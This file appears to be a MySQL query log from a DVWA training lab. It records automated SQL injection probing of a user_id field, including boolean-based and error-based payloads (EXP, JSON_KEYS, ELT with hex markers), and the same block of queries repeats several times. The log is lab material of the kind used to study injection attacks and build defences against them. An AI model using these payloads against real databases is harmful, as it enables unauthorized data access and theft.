"SELECT first_name, last_name FROM users WHERE user_id = '-2406'))) OR 7502=5128#'",0.000040,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1876')) AS sAiu WHERE 2076=2076 OR 8734=1357#'",0.000040,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-7856')) AS JqLs WHERE 8622=8622 OR 5362=5362#'",0.000040,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-6976') AS mHNG WHERE 1467=1467 OR 6858=4300#'",0.000040,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-8029') AS ylcm WHERE 2291=2291 OR 5362=5362#'",0.000040,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') OR NOT 7000=7798#'",0.000040,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR NOT 9427=5288#'",0.000040,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(1742=1742,1))),0x717a627871,0x78))s), 8446744073709551610, 8446744073709551610)))-- Uxbb'",0.000040,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(2467=2467,1))),0x717a627871,0x78))s), 8446744073709551610, 8446744073709551610)))-- mEBK'",0.000040,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(2877=2877,1))),0x717a627871,0x78))x))-- yZqn'",0.000040,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(6574=6574,1))),0x717a627871,0x78))x))-- iIhO'",0.000040,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7178786271,(SELECT (ELT(1385=1385,1))),0x717a627871)) USING utf8)))-- euNO'",0.000040,0,0,1563544499
USE dvwa,0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'",0.000165,0,0,1563544499
# administrator command: Quit,0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11.(')("".),('",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'PiKnBx<'"">vyombG'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3679=5937 AND ('MbAN'='MbAN'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2363=3768 AND 'bTEQ'='bTEQ'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3150=8607#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2650=8379#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AND 4628=4516#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'))) AND 6732=1522#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS tCXE WHERE 7819=7819 AND 8935=8675#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS JHQR WHERE 1512=1512 AND 6329=6329#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS xVtq WHERE 6522=6522 AND 4123=4875#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS cmPW WHERE 1683=1683 AND 6329=6329#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' IN BOOLEAN MODE) AND 2632=2823#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1446') OR 4214=6764#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2061' OR 8319=4112#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1130' wSLJKMCLbz#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-5628')) OR 8985=2879#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2406'))) OR 7502=5128#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1876')) AS sAiu WHERE 2076=2076 OR 8734=1357#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-7856')) AS JqLs WHERE 8622=8622 OR 5362=5362#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-6976') AS mHNG WHERE 1467=1467 OR 6858=4300#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-8029') AS ylcm WHERE 2291=2291 OR 5362=5362#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') OR NOT 7000=7798#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR NOT 9427=5288#'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(1742=1742,1))),0x717a627871,0x78))s), 8446744073709551610, 8446744073709551610)))-- Uxbb'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(2467=2467,1))),0x717a627871,0x78))s), 8446744073709551610, 8446744073709551610)))-- mEBK'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(2877=2877,1))),0x717a627871,0x78))x))-- yZqn'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(6574=6574,1))),0x717a627871,0x78))x))-- iIhO'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7178786271,(SELECT (ELT(1385=1385,1))),0x717a627871)) USING utf8)))-- euNO'",0.000165,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7178786271,(SELECT (ELT(2544=2544,1))),0x717a627871)) USING utf8)))-- CgAB'",0.000165,0,0,1563544499
USE dvwa,0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'",0.000002,0,0,1563544499
# administrator command: Quit,0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11.(')("".),('",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'PiKnBx<'"">vyombG'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3679=5937 AND ('MbAN'='MbAN'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2363=3768 AND 'bTEQ'='bTEQ'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3150=8607#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2650=8379#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AND 4628=4516#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'))) AND 6732=1522#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS tCXE WHERE 7819=7819 AND 8935=8675#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS JHQR WHERE 1512=1512 AND 6329=6329#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS xVtq WHERE 6522=6522 AND 4123=4875#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS cmPW WHERE 1683=1683 AND 6329=6329#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' IN BOOLEAN MODE) AND 2632=2823#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1446') OR 4214=6764#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2061' OR 8319=4112#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1130' wSLJKMCLbz#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-5628')) OR 8985=2879#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2406'))) OR 7502=5128#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1876')) AS sAiu WHERE 2076=2076 OR 8734=1357#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-7856')) AS JqLs WHERE 8622=8622 OR 5362=5362#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-6976') AS mHNG WHERE 1467=1467 OR 6858=4300#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-8029') AS ylcm WHERE 2291=2291 OR 5362=5362#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') OR NOT 7000=7798#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR NOT 9427=5288#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(1742=1742,1))),0x717a627871,0x78))s), 8446744073709551610, 8446744073709551610)))-- Uxbb'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(2467=2467,1))),0x717a627871,0x78))s), 8446744073709551610, 8446744073709551610)))-- mEBK'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(2877=2877,1))),0x717a627871,0x78))x))-- yZqn'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(6574=6574,1))),0x717a627871,0x78))x))-- iIhO'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7178786271,(SELECT (ELT(1385=1385,1))),0x717a627871)) USING utf8)))-- euNO'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7178786271,(SELECT (ELT(2544=2544,1))),0x717a627871)) USING utf8)))-- CgAB'",0.000002,0,0,1563544499
USE dvwa,0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'",0.000002,0,0,1563544499
# administrator command: Quit,0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11.(')("".),('",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'PiKnBx<'"">vyombG'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3679=5937 AND ('MbAN'='MbAN'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2363=3768 AND 'bTEQ'='bTEQ'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3150=8607#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2650=8379#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AND 4628=4516#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'))) AND 6732=1522#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS tCXE WHERE 7819=7819 AND 8935=8675#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS JHQR WHERE 1512=1512 AND 6329=6329#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS xVtq WHERE 6522=6522 AND 4123=4875#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS cmPW WHERE 1683=1683 AND 6329=6329#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' IN BOOLEAN MODE) AND 2632=2823#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1446') OR 4214=6764#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2061' OR 8319=4112#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1130' wSLJKMCLbz#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-5628')) OR 8985=2879#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2406'))) OR 7502=5128#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1876')) AS sAiu WHERE 2076=2076 OR 8734=1357#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-7856')) AS JqLs WHERE 8622=8622 OR 5362=5362#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-6976') AS mHNG WHERE 1467=1467 OR 6858=4300#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-8029') AS ylcm WHERE 2291=2291 OR 5362=5362#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') OR NOT 7000=7798#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR NOT 9427=5288#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(1742=1742,1))),0x717a627871,0x78))s), 8446744073709551610, 8446744073709551610)))-- Uxbb'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(2467=2467,1))),0x717a627871,0x78))s), 8446744073709551610, 8446744073709551610)))-- mEBK'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(2877=2877,1))),0x717a627871,0x78))x))-- yZqn'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(6574=6574,1))),0x717a627871,0x78))x))-- iIhO'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7178786271,(SELECT (ELT(1385=1385,1))),0x717a627871)) USING utf8)))-- euNO'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7178786271,(SELECT (ELT(2544=2544,1))),0x717a627871)) USING utf8)))-- CgAB'",0.000002,0,0,1563544499
USE dvwa,0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'",0.000043,0,0,1563544499
# administrator command: Quit,0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11.(')("".),('",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'PiKnBx<'"">vyombG'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3679=5937 AND ('MbAN'='MbAN'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2363=3768 AND 'bTEQ'='bTEQ'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3150=8607#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2650=8379#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AND 4628=4516#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'))) AND 6732=1522#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS tCXE WHERE 7819=7819 AND 8935=8675#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS JHQR WHERE 1512=1512 AND 6329=6329#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS xVtq WHERE 6522=6522 AND 4123=4875#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS cmPW WHERE 1683=1683 AND 6329=6329#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' IN BOOLEAN MODE) AND 2632=2823#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1446') OR 4214=6764#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2061' OR 8319=4112#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1130' wSLJKMCLbz#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-5628')) OR 8985=2879#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2406'))) OR 7502=5128#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1876')) AS sAiu WHERE 2076=2076 OR 8734=1357#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-7856')) AS JqLs WHERE 8622=8622 OR 5362=5362#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-6976') AS mHNG WHERE 1467=1467 OR 6858=4300#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-8029') AS ylcm WHERE 2291=2291 OR 5362=5362#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') OR NOT 7000=7798#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR NOT 9427=5288#'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(1742=1742,1))),0x717a627871,0x78))s), 8446744073709551610, 8446744073709551610)))-- Uxbb'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(2467=2467,1))),0x717a627871,0x78))s), 8446744073709551610, 8446744073709551610)))-- mEBK'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(2877=2877,1))),0x717a627871,0x78))x))-- yZqn'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7178786271,(SELECT (ELT(6574=6574,1))),0x717a627871,0x78))x))-- iIhO'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7178786271,(SELECT (ELT(1385=1385,1))),0x717a627871)) USING utf8)))-- euNO'",0.000043,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7178786271,(SELECT (ELT(2544=2544,1))),0x717a627871)) USING utf8)))-- CgAB'",0.000043,0,0,1563544499
USE dvwa,0.000399,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'",0.000399,0,0,1563544499
# administrator command: Quit,0.000399,0,0,1563544499
